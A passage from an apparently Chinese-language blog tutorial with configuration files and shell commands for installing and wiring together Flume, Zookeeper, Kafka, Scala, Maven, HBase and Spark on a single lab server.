class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Name the components on this agent</span></span><br><span class="line">a1.sources = r1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe/configure the source</span></span><br><span class="line">a1.sources.r1.type = netcat</span><br><span class="line">a1.sources.r1.bind = 192.168.32.130</span><br><span class="line">a1.sources.r1.port = 44444</span><br><span class="line"></span><br><span class="line"><span class="comment"># Describe the sink</span></span><br><span class="line">a1.sinks.k1.type = logger</span><br><span class="line"></span><br><span class="line"><span class="comment"># Use a channel which buffers events in memory</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transctionCapacity = 100</span><br><span class="line"></span><br><span class="line"><span class="comment">#Bind the source and sink to the channel</span></span><br><span class="line">a1.sources.r1.channels = c1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br></pre></td></tr></table></figure><p>9.案例三<br>监听指定目录，将目录下新增加的文件存储到 HDFS。<br>新建配置文件spooling-memory-hdfs.properties</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定agent的sources,sinks,channels</span></span><br><span class="line">a1.sources = s1  </span><br><span class="line">a1.sinks = k1  </span><br><span class="line">a1.channels = c1  </span><br><span class="line">   </span><br><span class="line"><span class="comment">#配置sources属性</span></span><br><span class="line">a1.sources.s1.type =spooldir  </span><br><span class="line">a1.sources.s1.spoolDir =/tmp/logs</span><br><span class="line">a1.sources.s1.basenameHeader = <span class="literal">true</span></span><br><span class="line">a1.sources.s1.basenameHeaderKey = fileName </span><br><span class="line"><span class="comment">#将sources与channels进行绑定  </span></span><br><span class="line">a1.sources.s1.channels =c1 </span><br><span class="line"></span><br><span class="line">   </span><br><span class="line"><span class="comment">#配置sink </span></span><br><span class="line">a1.sinks.k1.type = hdfs</span><br><span class="line">a1.sinks.k1.hdfs.path = /flume/events/%y-%m-%d/%H/</span><br><span class="line">a1.sinks.k1.hdfs.filePrefix = %&#123;fileName&#125;</span><br><span class="line"><span class="comment">#生成的文件类型，默认是Sequencefile，可用DataStream，则为普通文本</span></span><br><span class="line">a1.sinks.k1.hdfs.fileType = DataStream  </span><br><span class="line">a1.sinks.k1.hdfs.useLocalTimeStamp = <span class="literal">true</span></span><br><span class="line"><span class="comment">#将sinks与channels进行绑定  </span></span><br><span class="line">a1.sinks.k1.channel = c1</span><br><span class="line">   </span><br><span class="line"><span class="comment">#配置channel类型</span></span><br><span class="line">a1.channels.c1.type = memory</span><br></pre></td></tr></table></figure><p>10.案例四<br>将本服务器收集到的数据发送到另外一台服务器。<br>新建配置 netcat-memory-avro.properties，监听文件内容变化，然后将新的文件内容通过 avro sink 发送到 hadoop001 这台服务器的 8888 端口：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定agent的sources,sinks,channels</span></span><br><span class="line">a1.sources = s1</span><br><span class="line">a1.sinks = k1</span><br><span class="line">a1.channels = c1</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置sources属性</span></span><br><span class="line">a1.sources.s1.type = <span class="built_in">exec</span></span><br><span class="line">a1.sources.s1.command = <span class="built_in">tail</span> -F /tmp/log.txt</span><br><span class="line">a1.sources.s1.bash = /bin/bash -c</span><br><span class="line">a1.sources.s1.channels = c1</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置sink</span></span><br><span class="line">a1.sinks.k1.type = avro</span><br><span class="line">a1.sinks.k1.hostname = hadoop001</span><br><span class="line">a1.sinks.k1.port = 8888</span><br><span class="line">a1.sinks.k1.batch-size = 1</span><br><span class="line">a1.sinks.k1.channel = c1</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置channel类型</span></span><br><span class="line">a1.channels.c1.type = memory</span><br><span class="line">a1.channels.c1.capacity = 1000</span><br><span class="line">a1.channels.c1.transactionCapacity = 100</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>配置日志聚合Flume<br>使用 avro source 监听 hadoop001 服务器的 8888 端口，将获取到内容输出到控制台</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#指定agent的sources,sinks,channels</span></span><br><span class="line">a2.sources = s2</span><br><span class="line">a2.sinks = k2</span><br><span class="line">a2.channels = c2</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置sources属性</span></span><br><span class="line">a2.sources.s2.type = avro</span><br><span class="line">a2.sources.s2.bind = hadoop001</span><br><span class="line">a2.sources.s2.port = 8888</span><br><span class="line"></span><br><span class="line"><span class="comment">#将sources与channels进行绑定</span></span><br><span class="line">a2.sources.s2.channels = c2</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置sink</span></span><br><span class="line">a2.sinks.k2.type = logger</span><br><span class="line"></span><br><span class="line"><span class="comment">#将sinks与channels进行绑定</span></span><br><span class="line">a2.sinks.k2.channel = c2</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置channel类型</span></span><br><span class="line">a2.channels.c2.type = memory</span><br><span class="line">a2.channels.c2.capacity = 1000</span><br><span class="line">a2.channels.c2.transactionCapacity = 100</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里建议先启动a2，原因是 avro.source 会先与端口进行绑定，这样 avro sink 连接时才不会报无法连接的异常。但是即使不按顺序启动也是没关系的，sink 会一直重试，直至建立好连接。</p><h3 id="七-Zookeeper安装配置"><a href="#七-Zookeeper安装配置" class="headerlink" title="七.Zookeeper安装配置"></a>七.Zookeeper安装配置</h3><p>1.解压并配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ZOOKEEPER_HOME</span></span><br><span class="line"><span class="built_in">export</span> ZOOKEEPER_HOME=/root/software/zookeeper-3.4.5-cdh5.6.0</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$ZOOKEEPER_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>2.新建一个目录用来存放数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /root/software/zookeeper-3.4.5-cdh5.6.0/zk_data</span><br></pre></td></tr></table></figure><p>3.编辑配置文件<br>复制一份配置文件,并替换内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cp</span> zoo_sample.cfg zoo.cfg</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dataDir=/root/software/zookeeper-3.4.5-cdh5.6.0/zk_data</span><br></pre></td></tr></table></figure><p>4.启动</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./zkServer.sh start</span><br></pre></td></tr></table></figure><h3 id="八-kafka安装配置与使用"><a href="#八-kafka安装配置与使用" class="headerlink" title="八.kafka安装配置与使用"></a>八.kafka安装配置与使用</h3><p>1.解压并配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#KAFKA_HOME</span></span><br><span class="line"><span class="built_in">export</span> KAFKA_HOME=/root/software/kafka_2.11-2.0.0</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$KAFKA_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>2.创建日志文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /root/software/kafka_2.11-2.0.0/kafka-logs</span><br></pre></td></tr></table></figure><p>3.config文件夹中修改配置文件以下几项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gedit server.properties </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">log.dirs=/root/software/kafka_2.11-2.0.0/kafka-logs</span><br><span class="line"></span><br><span class="line">listeners=PLAINTEXT://localhost:9092</span><br></pre></td></tr></table></figure><p>4.启动kafka<br>启动kafka之前要先启动zookeeper</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-server-start.sh ./config/server.properties</span><br></pre></td></tr></table></figure><p>5.创建topic主题</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic topic-demo --replication-factor 1 --partitions 1</span><br></pre></td></tr></table></figure><p>6.查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics.sh --list --zookeeper localhost:2181</span><br></pre></td></tr></table></figure><p>7.生产消息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-console-producer.sh --broker-list localhost:9092 --topic topic-demo</span><br></pre></td></tr></table></figure><p>8.消费消息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-console-consumer.sh --bootstrap-server localhost:9092 --topic topic-demo</span><br><span class="line">--beginning 可选参数,代表从头消费</span><br></pre></td></tr></table></figure><p>9.查看所有topic的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics.sh --zookeeper localhost: 2181 --describe </span><br><span class="line">--topic topic-demo 可选参数,表示指定topic</span><br></pre></td></tr></table></figure><p>10.单节点多broker</p><ul><li>修改配合文件中的id,端口,日志文件夹</li><li>启动<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kafka-server-start.sh --deamon ./config/server.properties &amp;</span><br><span class="line">kafka-server-start.sh --deamon ./config/server2.properties &amp;</span><br><span class="line">kafka-server-start.sh --deamon ./config/server3.properties &amp;</span><br></pre></td></tr></table></figure></li><li>多副本<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kafka-topics.sh --zookeeper localhost: 2181/kafka --create --topic my-topic-demo --replication-factor 3 --partitions 1</span><br></pre></td></tr></table></figure></li></ul><h3 id="九-安装scala"><a href="#九-安装scala" class="headerlink" title="九.安装scala"></a>九.安装scala</h3><p>1.解压并配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software/scala-2.11.0<span class="comment"># tar -zxvf scala-2.11.0.tgz </span></span><br><span class="line">root@ubuntu:~/software/scala-2.11.0<span class="comment"># gedit /root/.bashrc </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#SCALA_HOME</span></span><br><span class="line"><span class="built_in">export</span> SCALA_HOME=/root/software/scala-2.11.0</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$SCALA_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>2.刷新环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software/scala-2.11.0<span class="comment"># source /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software/scala-2.11.0<span class="comment"># scala</span></span><br><span class="line">Welcome to Scala version 2.11.0 (Java HotSpot(TM) 64-Bit Server VM, Java 1.8.0_11).</span><br><span class="line">Type <span class="keyword">in</span> expressions to have them evaluated.</span><br><span class="line">Type :<span class="built_in">help</span> <span class="keyword">for</span> more information.</span><br><span class="line"></span><br><span class="line">scala&gt; </span><br></pre></td></tr></table></figure><h3 id="十-安装maven"><a href="#十-安装maven" class="headerlink" title="十.安装maven"></a>十.安装maven</h3><p>1.解压并配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software<span class="comment"># tar -zxvf apache-maven-3.8.5-bin.tar.gz</span></span><br><span class="line">root@ubuntu:~/software<span class="comment"># mv apache-maven-3.8.5 maven-3.8.5</span></span><br><span class="line">root@ubuntu:~/software<span class="comment"># gedit /root/.bashrc </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#MAVEN_HOME</span></span><br><span class="line"><span class="built_in">export</span> MAVEN_HOME=/root/software/maven-3.8.5</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$MAVEN_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>2.刷新环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software/scala-2.11.0<span class="comment"># source /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software/maven-3.8.5<span class="comment"># mvn -v</span></span><br><span class="line">Apache Maven 3.8.5 (3599d3414f046de2324203b78ddcf9b5e4388aa0)</span><br><span class="line">Maven home: /root/software/maven-3.8.5</span><br><span class="line">Java version: 1.8.0_11, vendor: Oracle Corporation, runtime: /root/software/jdk1.8.0_11/jre</span><br><span class="line">Default locale: en_US, platform encoding: UTF-8</span><br><span class="line">OS name: <span class="string">&quot;linux&quot;</span>, version: <span class="string">&quot;5.4.0-100-generic&quot;</span>, <span class="built_in">arch</span>: <span class="string">&quot;amd64&quot;</span>, family: <span class="string">&quot;unix&quot;</span></span><br></pre></td></tr></table></figure><p>4.修改jar包存放位置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software/maven-3.8.5<span class="comment"># mkdir maven-repos</span></span><br><span class="line">root@ubuntu:~/software/maven-3.8.5<span class="comment"># gedit conf/settings.xml </span></span><br></pre></td></tr></table></figure><p>添加一行</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>/root/software/maven-3.8.5/maven-repos<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="十一-Hbase安装"><a href="#十一-Hbase安装" class="headerlink" title="十一.Hbase安装"></a>十一.Hbase安装</h3><p>1.解压并配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software<span class="comment"># tar -zxvf hbase-1.2.0-bin.tar.gz </span></span><br><span class="line">root@ubuntu:~/software<span class="comment"># gedit /root/.bashrc </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#HBASE_HOME</span></span><br><span class="line"><span class="built_in">export</span> HBASE_HOME=/root/software/hbase-1.2.0</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$HBASE_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>2.刷新环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software<span class="comment"># source /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>3.编辑配置文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hbase-1.2.0/conf<span class="comment"># gedit hbase-env.sh</span></span><br></pre></td></tr></table></figure><p>修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#export JAVA_HOME=/usr/java/jdk1.6.0/</span></span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/root/software/jdk1.8.0_11</span><br></pre></td></tr></table></figure><p>修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># export HBASE_MANAGES_ZK=true</span></span><br><span class="line"><span class="built_in">export</span> HBASE_MANAGES_ZK=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>添加</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hbase-1.2.0/conf<span class="comment"># gedit hbase-site.xml </span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.cluster.distributed<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.rootdir<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>hdfs://master:9000/hbase<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.zookeeper.quorum<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>master<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">name</span>&gt;</span>hbase.master.info.port<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>60010<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br></pre></td></tr></table></figure><p>修改</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hbase-1.2.0/conf<span class="comment"># gedit regionservers </span></span><br></pre></td></tr></table></figure><p>为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">master</span><br></pre></td></tr></table></figure><p>4.启动hbase<br>首先要先启动zeekeeper</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software<span class="comment"># zkServer.sh start</span></span><br><span class="line">JMX enabled by default</span><br><span class="line">Using config: /root/software/zookeeper-3.4.5-cdh5.6.0/bin/../conf/zoo.cfg</span><br><span class="line">Starting zookeeper ... STARTED</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software<span class="comment"># start-hbase.sh </span></span><br><span class="line">starting master, logging to /root/software/hbase-1.2.0/logs/hbase-root-master-master.out</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=128m; support was removed <span class="keyword">in</span> 8.0</span><br><span class="line">Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed <span class="keyword">in</span> 8.0</span><br><span class="line">master: starting regionserver, logging to /root/software/hbase-1.2.0/bin/../logs/hbase-root-regionserver-master.out</span><br><span class="line">master: Java HotSpot(TM) 64-Bit Server VM warning: ignoring option PermSize=128m; support was removed <span class="keyword">in</span> 8.0</span><br><span class="line">master: Java HotSpot(TM) 64-Bit Server VM warning: ignoring option MaxPermSize=128m; support was removed <span class="keyword">in</span> 8.0</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hbase-1.2.0/bin<span class="comment"># jps</span></span><br><span class="line">2992 SecondaryNameNode</span><br><span class="line">4514 QuorumPeerMain</span><br><span class="line">3282 NodeManager</span><br><span class="line">6196 HRegionServer</span><br><span class="line">3143 ResourceManager</span><br><span class="line">6026 HMaster</span><br><span class="line">6330 Jps</span><br><span class="line">2636 NameNode</span><br><span class="line">2796 DataNode</span><br></pre></td></tr></table></figure><p>访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://master:60010</span><br></pre></td></tr></table></figure><p>6.测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/hbase-1.2.0/bin<span class="comment"># hbase shell</span></span><br><span class="line"></span><br><span class="line">hbase(main):001:0&gt; version</span><br><span class="line">1.2.0, r25b281972df2f5b15c426c8963cbf77dd853a5ad, Thu Feb 18 23:01:49 CST 2016</span><br></pre></td></tr></table></figure><h3 id="十二-Spark安装"><a href="#十二-Spark安装" class="headerlink" title="十二.Spark安装"></a>十二.Spark安装</h3><p>1.解压并配置环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software<span class="comment"># tar -zxvf spark-2.1.1-bin-hadoop2.7.tgz </span></span><br><span class="line">root@ubuntu:~/software<span class="comment"># gedit /root/.bashrc </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#SPARK_HOME</span></span><br><span class="line"><span class="built_in">export</span> SPARK_HOME=/root/software/spark-2.1.1-bin-hadoop2.7</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$SPARK_HOME</span>/bin:<span class="variable">$PATH</span></span><br></pre></td></tr></table></figure><p>2.刷新环境变量</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:~/software<span class="comment"># source /root/.bashrc </span></span><br></pre></td></tr></table></figure><p>3.测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@master:~/software/spark-2.1.1-bin-hadoop2.7<span class="comment"># spark-shell --version</span></span><br><span class="line">Welcome to</span><br><span class="line">      ____              __</span><br><span class="line">     / __/__  ___ _____/ /__</span><br><span class="line">    _\ \/ _ \/ _ `/ __/  <span class="string">&#x27;_/</span></span><br><span class="line"><span class="string">   /___/ .__/\_,_/_/ /_/\_\   version 2.1.1</span></span><br><span class="line"><span class="string">      /_/</span></span><br><span class="line"><span class="string">                        </span></span><br><span class="line"><span class="string">Using Scala version 2.11.8, Java HotSpot(TM) 64-Bit Server VM, 1.8.0_11</span></span><br><span class="line"><span class="string">Branch </span></span><br><span class="line"><span class="string">Compiled by user jenkins on 2017-04-25T23:51:10Z</span></span><br><span class="line"><span class="string">Revision </span></span><br><span class="line"><span class="string">Url </span></span><br><span class="line"><span class="string">Type --help for more information.</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h3 id="十三-flume对接kafka"><a href="#十三-flume对接kafka" class="headerlink" title="十三.flume对接kafka"></a>十三.flume对接kafka</h3><p>一般flume采集的方式有两种<br>1.Exec类型的Source<br>可以将命令产生的输出作为源，如：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a1.sources.r1.type = exec</span><br><span class="line">a1.sources.r1.command = tail -F /tmp/log.txt //此处输入命令</span><br></pre></td></tr></table></figure><p>2.Spooling Directory类型的 Source<br>将指定的文件加入到“自动搜集 ”目录中。flume会持续监听这个目录，把文件当做source来处理。注意：一旦文件被放到“自动收集”目录中后，便不能修改，如果修改，flume会报错。此外，也不能有重名的文件，如果有，flume也会报错。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a1.sources.r1.type = spooldir</span><br><span class="line">a1.sources.r1.spoolDir = /home/work/data</span><br></pre></td></tr></table></figure><h4 id="1-flume采集某日志文件到kafka自定义topic"><a href="#1-flume采集某日志文件到kafka自定义topic" class="headerlink" title="1.flume采集某日志文件到kafka自定义topic"></a>1.flume采集某日志文件到kafka自定义topic</h4><p>1.1 创建flume配置文件 flume-kafka-file.conf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 